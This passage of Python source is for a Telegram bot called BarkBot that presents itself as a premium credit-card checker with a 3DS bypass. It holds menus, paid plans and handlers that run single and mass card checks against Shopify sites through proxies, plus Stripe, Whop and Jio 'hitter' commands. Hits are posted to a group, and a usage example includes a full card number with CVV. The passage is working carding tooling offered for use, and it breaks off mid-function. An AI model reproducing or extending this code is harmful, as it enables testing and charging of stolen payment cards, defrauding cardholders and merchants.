         Button.inline("Profile", b"menu_profile", style="primary")],
        [Button.inline("Commands", b"menu_commands", style="primary"),
         Button.inline("Contact", b"menu_contact", style="success")]
    ]

def get_checker_keyboard():
    return [
        [Button.inline("CHARGE", b"charge_menu", style="primary")]
    ]

def get_hitter_keyboard():
    return [
        [Button.inline("Stripe Hitter", b"sto_menu", style="primary"),
         Button.inline("Whop Hitter", b"whop_menu", style="danger")],
        [Button.inline("Jio Recharge", b"jio_menu", style="success")]
    ]

def get_plans_keyboard():
    return [
        [Button.inline("Free", b"plan_info_Free", style="success")],
        [Button.inline("Sed", b"plan_info_Sed", style="primary")],
        [Button.inline("Pro", b"plan_info_Pro", style="primary")],
        [Button.inline("Bot Op", b"plan_info_Bot Op", style="primary")],
        [Button.inline("TeamMate", b"plan_info_TeamMate", style="primary")],
        [Button.inline("Admin", b"plan_info_Admin", style="danger")],
        [Button.inline("Owner", b"plan_info_Owner", style="danger")]
    ]

def get_back_keyboard(cb=b"main_menu"):
    return [[Button.inline("Back", cb, style="danger")]]

def get_price_range_keyboard(action):
    return [
        [Button.inline("$1 - $5", f"pr_1_5_{action}".encode(), style="success"),
         Button.inline("$10 - $20", f"pr_10_20_{action}".encode(), style="primary")]
    ]

def get_site_range_keyboard():
    return [
        [Button.inline("$1 - $5", b"site_range_1_5", style="success"),
         Button.inline("$10 - $20", b"site_range_10_20", style="primary")],
        [Button.inline("Back", b"adm_panel", style="danger")]
    ]

def get_admin_panel_keyboard():
    return [
        [Button.inline("GenKeys", b"adm_genkeys", style="success"),
         Button.inline("Bot On/Off", b"adm_bot", style="success")],
        [Button.inline("Add Premium", b"adm_addpremium", style="success"),
         Button.inline("Remove Prem", b"adm_rmpremium", style="success")],
        [Button.inline("Ban User", b"adm_ban", style="danger"),
         Button.inline("Unban User", b"adm_unban", style="danger")],
        [Button.inline("Bot Status", b"adm_status", style="primary"),
         Button.inline("Users", b"adm_users", style="primary")],
        [Button.inline("Premium List", b"adm_premlist", style="primary"),
         Button.inline("Plans", b"adm_plans", style="primary")],
        [Button.inline("Site Cmds", b"adm_sites", style="primary"),
         Button.inline("Proxy Cmds", b"adm_proxies", style="primary")],
        [Button.inline("Broadcast", b"adm_broadcast", style="primary"),
         Button.inline("Back", b"main_menu", style="danger")]
    ]

def get_proxy_menu_keyboard():
    return [
        [Button.inline("Shopify", b"pxy_shopify", style="primary"),
         Button.inline("Whop", b"pxy_whop", style="primary")],
        [Button.inline("Hitter", b"pxy_hitter", style="primary")],
        [Button.inline("Back", b"adm_panel", style="danger")]
    ]

# ============================================================
#  /start
# ============================================================
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    uid = event.sender_id
    if await check_banned(event):
        await event.reply(premium_emoji("🚫 <b>You are banned.</b>"), parse_mode='html'); return
    if await check_bot_status(event):
        await event.reply(premium_emoji("🔴 <b>Bot is OFF.</b>"), parse_mode='html'); return
    if not await is_user_joined(uid):
        text = (
            f'[⌯] <b>𝗔𝗰𝗰𝗲𝘀𝘀 𝗥𝗲𝘀𝘁𝗿𝗶𝗰𝘁𝗲𝗱</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] <tg-emoji emoji-id="{E["⚠️"]}">⚠️</tg-emoji> <b>You must join our channel</b>\n'
            f'[⌯] <b>and group to use this bot.</b>\n\n'
            f'[⌯] <tg-emoji emoji-id="{E["🔗"]}">🔗</tg-emoji> <b>Channel</b> ⌁ {FORCE_JOIN_CHANNELS[0]["url"]}\n'
            f'[⌯] <tg-emoji emoji-id="{E["🔗"]}">🔗</tg-emoji> <b>Group</b> ⌁ {FORCE_JOIN_CHANNELS[1]["url"]}\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] <tg-emoji emoji-id="{E["👋"]}">👋</tg-emoji> <b>Tap below to join, then Verify</b>'
        )
        if os.path.exists(WELCOME_IMAGE_PATH):
            await event.reply(premium_emoji(text), file=WELCOME_IMAGE_PATH, buttons=get_force_join_keyboard(), parse_mode='html')
        else:
            await event.reply(premium_emoji(text), buttons=get_force_join_keyboard(), parse_mode='html')
        return
    try:
        s = await event.get_sender()
        username = s.username if s.username else f"user_{uid}"
    except: username = f"user_{uid}"
    await create_user_if_not_exists(uid, username)

    plan = get_user_plan(uid)
    mass_limit = get_mass_limit(uid)

    text = (
        f'[⌯] <b>𝗕𝗼𝘁</b> ⌁ <b>BarkBot</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
        f'[⌯] <b>𝗧𝘆𝗽𝗲</b> ⌁ <b>𝙿𝚛𝚎𝚖𝚒𝚞𝚖 𝙲𝙲 𝙲𝚑𝚎𝚌𝚔𝚎𝚛</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
        f'[⌯] <b>𝗚𝗮𝘁𝗲</b> ⌁ <b>𝚂𝚑𝚘𝚙𝚒𝚏𝚢</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
        f'[⌯] <b>𝟯𝗗𝗦</b> ⌁ <b>𝙱𝚢𝚙𝚊𝚜𝚜 𝚂𝚞𝚙𝚙𝚘𝚛𝚝𝚎𝚍</b> ⌁ <tg-emoji emoji-id="{E["✅"]}">✅</tg-emoji>\n'
        f'[⌯] <b>𝗣𝗹𝗮𝗻</b> ⌁ <b>{plan}</b> ⌁ <tg-emoji emoji-id="{E["👑"]}">👑</tg-emoji>\n'
        f'[⌯] <b>𝗠𝗮𝘀𝘀 𝗟𝗶𝗺𝗶𝘁</b> ⌁ <b>{"Unlimited" if mass_limit > 100000 else mass_limit}</b>\n\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
        f'[⌯] <b>𝗠𝗲𝗻𝘂</b> ⌁ <b>𝚂𝚎𝚕𝚎𝚌𝚝 𝚘𝚙𝘁𝗶𝗼𝗻 𝗯𝗲𝗹𝗼𝘄</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
    )
    if os.path.exists(WELCOME_IMAGE_PATH):
        await event.reply(premium_emoji(text), file=WELCOME_IMAGE_PATH, buttons=get_main_keyboard(), parse_mode='html')
    else:
        await event.reply(premium_emoji(text), buttons=get_main_keyboard(), parse_mode='html')

# ============================================================
#  /admin
# ============================================================
@bot.on(events.NewMessage(pattern='/admin'))
async def admin_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(premium_emoji("❌ <b>Admin Only!</b>"), parse_mode='html'); return
    text = "<b>👑 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟</b>\n\n<b>Select option below.</b>"
    await event.reply(premium_emoji(text), buttons=get_admin_panel_keyboard(), parse_mode='html')

# ============================================================
#  CALLBACK HANDLER
# ============================================================
@bot.on(events.CallbackQuery)
async def callback_handler(event):
    uid = event.sender_id
    data = event.data.decode('utf-8')
    if await check_banned(event): await event.answer("Banned", alert=True); return
    if await check_bot_status(event) and not data.startswith("adm_"): await event.answer("Bot OFF", alert=True); return

    # ===== STOP BUTTON =====
    if data == "stop_mass":
        stopped = 0
        for k in list(active_sessions.keys()):
            if k.startswith(f"{uid}_"):
                del active_sessions[k]
                stopped += 1
        if stopped:
            await event.answer("🛑 Stopped!", alert=True)
            try:
                await event.edit(premium_emoji("🛑 <b>Mass Check Stopped!</b>"), parse_mode='html')
            except: pass
        else:
            await event.answer("❌ No active check!", alert=True)
        return

    if data == "verify_join":
        if await is_user_joined(uid):
            await event.answer("Verified! Welcome.", alert=True)
            try:
                s = await event.get_sender()
                uname = s.username if s.username else f"user_{uid}"
            except: uname = f"user_{uid}"
            await create_user_if_not_exists(uid, uname)
            plan = get_user_plan(uid)
            mass_limit = get_mass_limit(uid)
            text = (
                f'[⌯] <b>𝗕𝗼𝘁</b> ⌁ <b>BarkBot</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
                f'[⌯] <b>𝗧𝘆𝗽𝗲</b> ⌁ <b>𝙿𝚛𝚎𝚖𝚒𝚞𝚖 𝙲𝙲 𝙲𝚑𝚎𝚌𝚔𝚎𝚛</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
                f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
                f'[⌯] <b>𝗣𝗹𝗮𝗻</b> ⌁ <b>{plan}</b> ⌁ <tg-emoji emoji-id="{E["👑"]}">👑</tg-emoji>\n'
                f'[⌯] <b>𝗠𝗮𝘀𝘀 𝗟𝗶𝗺𝗶𝘁</b> ⌁ <b>{"Unlimited" if mass_limit > 100000 else mass_limit}</b>\n\n'
                f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
                f'[⌯] <b>𝗠𝗲𝗻𝘂</b> ⌁ <b>𝚂𝚎𝚕𝚎𝚌𝚝 𝚘𝚙𝘁𝗶𝗼𝗻 𝗯𝗲𝗹𝗼𝘄</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
            )
            try: await event.delete()
            except: pass
            if os.path.exists(WELCOME_IMAGE_PATH):
                await event.respond(premium_emoji(text), file=WELCOME_IMAGE_PATH, buttons=get_main_keyboard(), parse_mode='html')
            else:
                await event.respond(premium_emoji(text), buttons=get_main_keyboard(), parse_mode='html')
        else: await event.answer("You haven't joined yet!", alert=True)
        return

    if data == "main_menu":
        plan = get_user_plan(uid)
        mass_limit = get_mass_limit(uid)
        text = (
            f'[⌯] <b>𝗕𝗼𝘁</b> ⌁ <b>BarkBot</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
            f'[⌯] <b>𝗧𝘆𝗽𝗲</b> ⌁ <b>𝙿𝚛𝚎𝚖𝚒𝚞𝚖 𝙲𝙲 𝙲𝚑𝚎𝚌𝚔𝚎𝚛</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] <b>𝗣𝗹𝗮𝗻</b> ⌁ <b>{plan}</b> ⌁ <tg-emoji emoji-id="{E["👑"]}">👑</tg-emoji>\n'
            f'[⌯] <b>𝗠𝗮𝘀𝘀 𝗟𝗶𝗺𝗶𝘁</b> ⌁ <b>{"Unlimited" if mass_limit > 100000 else mass_limit}</b>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] <b>𝗠𝗲𝗻𝘂</b> ⌁ <b>𝚂𝚎𝚕𝚎𝚌𝚝 𝚘𝚙𝘁𝗶𝗼𝗻 𝗯𝗲𝗹𝗼𝘄</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
        )
        try:
            if os.path.exists(WELCOME_IMAGE_PATH):
                await event.delete()
                await event.respond(premium_emoji(text), file=WELCOME_IMAGE_PATH, buttons=get_main_keyboard(), parse_mode='html')
            else:
                await event.edit(premium_emoji(text), buttons=get_main_keyboard(), parse_mode='html')
        except: pass
        await event.answer(); return

    if data == "menu_checker":
        text = (
            f'[⌯] <b>𝗖𝗵𝗲𝗰𝗸𝗲𝗿</b> ⌁ <b>𝚂𝚎𝚕𝚎𝚌𝚝 𝙶𝚊𝚝𝚎</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] <tg-emoji emoji-id="{E["💎"]}">💎</tg-emoji> <b>CHARGE</b> ⌁ <code>/sh</code> <code>/msh</code>\n'
        )
        await event.edit(premium_emoji(text), buttons=get_checker_keyboard(), parse_mode='html'); await event.answer(); return

    if data == "menu_hitter":
        text = (
            f'[⌯] <b>𝗛𝗶𝘁𝘁𝗲𝗿</b> ⌁ <b>𝙲𝚘𝚖𝚖𝚊𝚗𝚍𝚜</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] <tg-emoji emoji-id="{E["💳"]}">💳</tg-emoji> <b>Stripe Hitter</b> ⌁ <code>/sto</code> <code>/msto</code>\n'
            f'[⌯] <tg-emoji emoji-id="{E["🔥"]}">🔥</tg-emoji> <b>Whop Hitter</b> ⌁ <code>/whop</code> <code>/whopchk</code>\n'
            f'[⌯] <tg-emoji emoji-id="{E["💎"]}">💎</tg-emoji> <b>Jio Recharge</b> ⌁ <code>/jio</code>'
        )
        await event.edit(premium_emoji(text), buttons=get_hitter_keyboard(), parse_mode='html'); await event.answer(); return

    if data == "charge_menu":
        text = (
            f'[⌯] <b>𝗖𝗛𝗔𝗥𝗚𝗘</b> ⌁ <b>𝙲𝚘𝚖𝚖𝚊𝚗𝚍𝚜</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] <tg-emoji emoji-id="{E["💎"]}">💎</tg-emoji> <code>/sh</code> ⌁ Shopify Charge Single\n'
            f'[⌯] <tg-emoji emoji-id="{E["💎"]}">💎</tg-emoji> <code>/msh</code> ⌁ Shopify Charge Mass\n\n'
            f'<b>Usage:</b>\n<code>/sh cc|mm|yy|cvv</code>'
        )
        await event.edit(premium_emoji(text), buttons=get_back_keyboard(b"menu_checker"), parse_mode='html'); await event.answer(); return

    if data == "sto_menu":
        text = (
            f'[⌯] <b>𝗦𝘁𝗿𝗶𝗽𝗲 𝗛𝗶𝘁𝘁𝗲𝗿</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] <code>/sto URL CC</code> ⌁ Single\n'
            f'[⌯] <code>/msto URL</code> ⌁ Mass\n\n'
            f'<b>Proxy Required:</b> /setproxy'
        )
        await event.edit(premium_emoji(text), buttons=get_back_keyboard(b"menu_hitter"), parse_mode='html'); await event.answer(); return

    if data == "whop_menu":
        text = (
            f'[⌯] <b>𝗪𝗵𝗼𝗽 𝗛𝗶𝘁𝘁𝗲𝗿</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] <code>/whop URL CC</code> ⌁ Single\n'
            f'[⌯] <code>/whopchk URL</code> ⌁ Mass\n\n'
            f'<b>Proxy Required:</b> /setproxy'
        )
        await event.edit(premium_emoji(text), buttons=get_back_keyboard(b"menu_hitter"), parse_mode='html'); await event.answer(); return

    if data == "jio_menu":
        text = (
            f'[⌯] <b>𝗝𝗶𝗼 𝗥𝗲𝗰𝗵𝗮𝗿𝗴𝗲</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] <tg-emoji emoji-id="{E["💳"]}">💳</tg-emoji> <b>Gate</b> ⌁ JIO RECHARGE\n'
            f'[⌯] <tg-emoji emoji-id="{E["📊"]}">📊</tg-emoji> <b>Health</b> ⌁ 100%\n\n'
            f'[⌯] <b>Command:</b>\n<code>/jio &lt;number&gt; &lt;amount&gt; &lt;cc|mm|yy|cvv&gt;</code>\n\n'
            f'[⌯] <b>Example:</b>\n<code>/jio 9334844022 11 5488093918471306|10|26|685</code>\n\n'
            f'[⌯] <b>Amounts:</b>\n'
            f'Small ⌁ 19 · 29 · 49 · 69 · 98\n'
            f'Low ⌁ 129 · 155 · 199 · 219 · 239\n'
            f'Medium ⌁ 299 · 349 · 399 · 449 · 499\n'
            f'High ⌁ 599 · 719 · 839 · 999 · 1499\n\n'
            f'<b>Proxy Required:</b> /setproxy'
        )
        await event.edit(premium_emoji(text), buttons=get_back_keyboard(b"menu_hitter"), parse_mode='html'); await event.answer(); return

    if data == "menu_plans":
        text = (
            f'[⌯] <b>𝗣𝗹𝗮𝗻𝘀</b> ⌁ <b>𝙿𝚛𝚎𝚖𝚒𝚞𝚖</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] <tg-emoji emoji-id="{E["🆓"]}">🆓</tg-emoji> <b>Free</b> ⌁ Single Only\n'
            f'[⌯] <tg-emoji emoji-id="{E["⭐"]}">⭐</tg-emoji> <b>Sed</b> ⌁ Mass 50\n'
            f'[⌯] <tg-emoji emoji-id="{E["💎"]}">💎</tg-emoji> <b>Pro</b> ⌁ Mass 500\n'
            f'[⌯] <tg-emoji emoji-id="{E["🤖"]}">🤖</tg-emoji> <b>Bot Op</b> ⌁ Mass 5000\n'
            f'[⌯] <tg-emoji emoji-id="{E["👥"]}">👥</tg-emoji> <b>TeamMate</b> ⌁ Mass 5000\n'
            f'[⌯] <tg-emoji emoji-id="{E["👑"]}">👑</tg-emoji> <b>Admin</b> ⌁ Mass 5000\n'
            f'[⌯] <tg-emoji emoji-id="{E["🔱"]}">🔱</tg-emoji> <b>Owner</b> ⌁ Unlimited'
        )
        await event.edit(premium_emoji(text), buttons=get_plans_keyboard(), parse_mode='html'); await event.answer(); return

    if data == "menu_profile":
        d = load_json_file(f"user_{uid}.json", {})
        plan = get_user_plan(uid)
        mass_limit = get_mass_limit(uid)
        try:
            s = await event.get_sender()
            un = s.username if s.username else f"user_{uid}"
            fn = s.first_name if s.first_name else "User"
        except: un, fn = f"user_{uid}", "User"
        text = (
            f'[⌯] <b>𝗣𝗿𝗼𝗳𝗶𝗹𝗲</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] <b>ID</b> ⌁ <code>{uid}</code>\n'
            f'[⌯] <b>Name</b> ⌁ {fn}\n'
            f'[⌯] <b>Username</b> ⌁ @{un}\n'
            f'[⌯] <b>Plan</b> ⌁ {plan}\n'
            f'[⌯] <b>Mass Limit</b> ⌁ {"Unlimited" if mass_limit > 100000 else mass_limit}\n'
            f'[⌯] <b>Checks</b> ⌁ {d.get("total_checks",0)}\n'
            f'[⌯] <b>Hits</b> ⌁ {d.get("successful_checks",0)}'
        )
        await event.edit(premium_emoji(text), buttons=get_back_keyboard(), parse_mode='html'); await event.answer(); return

    if data == "menu_commands":
        text = (
            f'[⌯] <b>𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] <code>/sh</code> <code>/msh</code> ⌁ Shopify Charge\n'
            f'[⌯] <code>/sto</code> <code>/msto</code> ⌁ Stripe Hitter\n'
            f'[⌯] <code>/whop</code> <code>/whopchk</code> ⌁ Whop Hitter\n'
            f'[⌯] <code>/jio</code> ⌁ Jio Recharge\n'
            f'[⌯] <code>/setproxy</code> ⌁ Set Proxy\n'
            f'[⌯] <code>/redeem</code> <code>/fb</code> ⌁ Support'
        )
        await event.edit(premium_emoji(text), buttons=get_back_keyboard(), parse_mode='html'); await event.answer(); return

    if data == "menu_contact":
        text = (
            f'[⌯] <b>𝗖𝗼𝗻𝘁𝗮𝗰𝘁</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] <tg-emoji emoji-id="{E["👤"]}">👤</tg-emoji> <b>Dev</b> ⌁ @Ishanicarder'
        )
        kb = [
            [Button.url("Contact Dev", "https://t.me/ishanicarder", style="primary")],
            [Button.inline("Back", b"main_menu", style="danger")]
        ]
        await event.edit(premium_emoji(text), buttons=kb, parse_mode='html'); await event.answer(); return

    # ===== PLAN INFO =====
    if data.startswith("plan_info_"):
        plan_name = data.replace("plan_info_", "")
        plan_data = PLAN_LIMITS.get(plan_name, {})
        txt = (
            f'[⌯] <b>𝗣𝗹𝗮𝗻</b> ⌁ <b>{plan_name}</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] Single Check ⌁ {"✅" if plan_data.get("single") else "❌"}\n'
            f'[⌯] Mass Check ⌁ {plan_data.get("mass", 0) if plan_data.get("mass", 0) < 100000 else "Unlimited"}\n'
            f'[⌯] Proxy Add ⌁ {"✅" if plan_data.get("proxy") else "❌"}\n'
            f'[⌯] Workers ⌁ {plan_data.get("workers", 5)}\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'<i>To buy this plan, contact @Ishanicarder</i>'
        )
        await event.edit(premium_emoji(txt), buttons=get_back_keyboard(b"menu_plans"), parse_mode='html'); await event.answer(); return

    # ===== ADMIN =====
    if data == "admin_panel":
        if not is_admin(uid): await event.answer("Admin only!", alert=True); return
        text = "<b>👑 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟</b>\n\n<b>Select option below.</b>"
        await event.edit(premium_emoji(text), buttons=get_admin_panel_keyboard(), parse_mode='html'); await event.answer(); return

    if data == "adm_genkeys": await event.answer(); await event.reply(premium_emoji("🔑 <code>/key days plan</code>\n\n<b>Plans:</b> Free, Sed, Pro, Bot Op, TeamMate, Admin, Owner"), parse_mode='html'); return
    if data == "adm_bot":
        await event.answer(); cur = get_bot_status(); new = "off" if cur == "on" else "on"; set_bot_status(new)
        await event.reply(premium_emoji(f"{'🟢' if new=='on' else '🔴'} <b>Bot is now {new.upper()}</b>"), parse_mode='html'); return
    if data == "adm_addpremium": await event.answer(); await event.reply(premium_emoji("⭐ <code>/addpremium user_id</code>"), parse_mode='html'); return
    if data == "adm_rmpremium": await event.answer(); await event.reply(premium_emoji("❌ <code>/removepremium user_id</code>"), parse_mode='html'); return
    if data == "adm_ban": await event.answer(); await event.reply(premium_emoji("🚫 <code>/ban user_id</code>"), parse_mode='html'); return
    if data == "adm_unban": await event.answer(); await event.reply(premium_emoji("✅ <code>/unban user_id</code>"), parse_mode='html'); return
    if data == "adm_status":
        await event.answer()
        total = sum(1 for f in os.listdir('.') if f.startswith('user_') and f.endswith('.json'))
        txt = (
            f'<b>Bot Status</b>\n\n'
            f'Status: <b>{get_bot_status().upper()}</b>\n'
            f'Users: {total}\n'
            f'Premium: {len(load_premium_users())}\n'
            f'Banned: {len(load_banned())}\n'
            f'Sites 1-5: {len(load_sites_1_5())}\n'
            f'Sites 10-20: {len(load_sites_10_20())}'
        )
        await event.reply(premium_emoji(txt), parse_mode='html'); return
    if data == "adm_users":
        await event.answer()
        total = sum(1 for f in os.listdir('.') if f.startswith('user_') and f.endswith('.json'))
        await event.reply(premium_emoji(f'👥 <b>Total Users:</b> {total}'), parse_mode='html'); return
    if data == "adm_premlist":
        await event.answer()
        pu = load_premium_users()
        if not pu: await event.reply(premium_emoji("No premium users."), parse_mode='html'); return
        txt = "<b>Premium Users:</b>\n\n" + "\n".join([f"{i}. <code>{u}</code>" for i, u in enumerate(pu, 1)])
        await event.reply(premium_emoji(txt), parse_mode='html'); return
    if data == "adm_plans":
        await event.answer()
        txt = "<b>Plans:</b>\n\n" + "\n".join([f"• {p} → Mass: {PLAN_LIMITS[p]['mass'] if PLAN_LIMITS[p]['mass'] < 100000 else 'Unlimited'}" for p in VALID_PLANS])
        await event.reply(premium_emoji(txt), parse_mode='html'); return
    if data == "adm_sites":
        await event.answer()
        txt = (
            f'<b>Site Commands (Price Range)</b>\n\n'
            f'<code>/site</code> — Add sites (test first)\n'
            f'<code>/rmsite 1-5 domain.com</code> — Remove site\n'
            f'<code>/mysites</code> — List sites\n'
            f'<code>/sitecheck</code> — Test sites\n\n'
            f'Sites 1-5: {len(load_sites_1_5())}\n'
            f'Sites 10-20: {len(load_sites_10_20())}'
        )
        await event.reply(premium_emoji(txt), parse_mode='html'); return
    if data == "adm_proxies":
        await event.answer()
        await event.reply(premium_emoji("<b>Select Proxy Gate:</b>"), buttons=get_proxy_menu_keyboard(), parse_mode='html'); return
    if data == "pxy_shopify":
        await event.answer()
        txt = f'<b>Shopify Proxies</b>\n\n<code>/setproxy ip:port</code>\n<code>/myproxy</code>\n<code>/clearproxy</code>'
        await event.edit(premium_emoji(txt), buttons=get_back_keyboard(b"adm_proxies"), parse_mode='html'); return
    if data == "pxy_whop":
        await event.answer()
        txt = f'<b>Whop Proxies</b>\n\nSame /setproxy use karega'
        await event.edit(premium_emoji(txt), buttons=get_back_keyboard(b"adm_proxies"), parse_mode='html'); return
    if data == "pxy_hitter":
        await event.answer()
        txt = f'<b>Hitter Proxies</b>\n\nSame /setproxy use karega'
        await event.edit(premium_emoji(txt), buttons=get_back_keyboard(b"adm_proxies"), parse_mode='html'); return
    if data == "adm_broadcast": await event.answer(); await event.reply(premium_emoji("📢 <code>/broadcast message</code>"), parse_mode='html'); return
    if data == "adm_panel":
        if not is_admin(uid): return
        text = "<b>👑 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟</b>\n\n<b>Select option below.</b>"
        await event.edit(premium_emoji(text), buttons=get_admin_panel_keyboard(), parse_mode='html'); await event.answer(); return

    # ===== SITE PRICE RANGE =====
    if data == "site_range_1_5":
        await event.answer(); pending_site_range[uid] = {"range": "1_5"}
        await event.reply(premium_emoji("✅ <b>Selected $1-5</b>\n\nSend sites (one per line):\n<code>site1.com\nsite2.com</code>\n\n<i>Sites will be tested first. Only alive sites will be added.</i>"), parse_mode='html'); return
    if data == "site_range_10_20":
        await event.answer(); pending_site_range[uid] = {"range": "10_20"}
        await event.reply(premium_emoji("✅ <b>Selected $10-20</b>\n\nSend sites (one per line):\n<code>site1.com\nsite2.com</code>\n\n<i>Sites will be tested first. Only alive sites will be added.</i>"), parse_mode='html'); return

    # ===== CHECK PRICE RANGE =====
    if data.startswith("pr_1_5_") or data.startswith("pr_10_20_"):
        is_1_5 = data.startswith("pr_1_5_")
        sites = load_sites_1_5() if is_1_5 else load_sites_10_20()
        if not sites:
            await event.answer(f"No sites for {'$1-5' if is_1_5 else '$10-20'}!", alert=True); return
        pending = pending_price_range.get(uid)
        if not pending: await event.answer("Session expired!", alert=True); return
        action = pending.get('action')
        if action == 'sh':
            card = pending.get('cc')
            del pending_price_range[uid]
            await event.answer("Checking...")
            await run_shopify_single(event, uid, card, sites)
        elif action == 'msh':
            cards = pending.get('cards', [])
            del pending_price_range[uid]
            await event.answer("Starting mass check...")
            await run_shopify_mass(event, uid, sites, cards)
        return

# ============================================================
#  SHOPIFY CHECK
# ============================================================
async def run_shopify_single(event, uid, card, sites):
    proxies = get_proxies_for_check(uid, "shopify")
    if not proxies:
        await event.respond(premium_emoji(
            f'[⌯] <b>𝗣𝗿𝗼𝘅𝘆 ⌁ 𝙽𝚘𝚝 𝚂𝚎𝚝</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'[⌯] <b>𝗦𝗲𝘁</b> ⌁ <code>/setproxy ip:port</code> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
            f'[⌯] <b>𝗔𝘂𝘁𝗵</b> ⌁ <code>/setproxy ip:port:user:pass</code> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
        ), parse_mode='html'); return
    start_time = time.time()
    sm = await event.respond(premium_emoji(f"⚡ <b>Checking...</b>\n\n{card}"), parse_mode='html')
    try:
        r = await check_card_with_retry(card, sites, proxies, max_retries=1)
        elapsed = time.time() - start_time
        await save_user_stats(uid, success=(r['status'] in ['Charged','Approved']))
        checker_name = await get_checker_mention(uid)
        gw = r.get('gateway','Shopify Payments')
        pr = r.get('price','0.98')

        if r['status'] == 'Charged':
            await send_hit_to_group(uid, card, r['message'], gw, 'Charged', pr)
            await send_check_result(uid, card, 'Charged', r['message'], gw, pr, elapsed, checker_name)
        elif r['status'] == 'Approved':
            await send_hit_to_group(uid, card, r['message'], gw, 'Approved', pr)
            await send_check_result(uid, card, 'Approved', r['message'], gw, pr, elapsed, checker_name)
        elif r['status'] == 'Site Error':
            await send_check_result(uid, card, 'Error', r['message'], gw, pr, elapsed, checker_name)
        else:
            await send_check_result(uid, card, 'Dead', r['message'], gw, pr, elapsed, checker_name)

        try: await sm.delete()
        except: pass
    except Exception as e:
        try:
            await send_check_result(uid, card, 'Error', str(e)[:80], 'Shopify Payments', '0.98', time.time()-start_time, await get_checker_mention(uid))
            try: await sm.delete()
            except: pass
        except:
            await sm.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

async def run_shopify_mass(event, uid, sites, cards):
    plan = get_user_plan(uid)
    mass_limit = get_mass_limit(uid)
    if mass_limit == 0:
        await event.respond(premium_emoji(f"❌ Your plan ({plan}) does not support Mass Check."), parse_mode='html'); return
    if len(cards) > mass_limit: cards = cards[:mass_limit]
    proxies = get_proxies_for_check(uid, "shopify")
    if not proxies:
        await event.respond(premium_emoji(
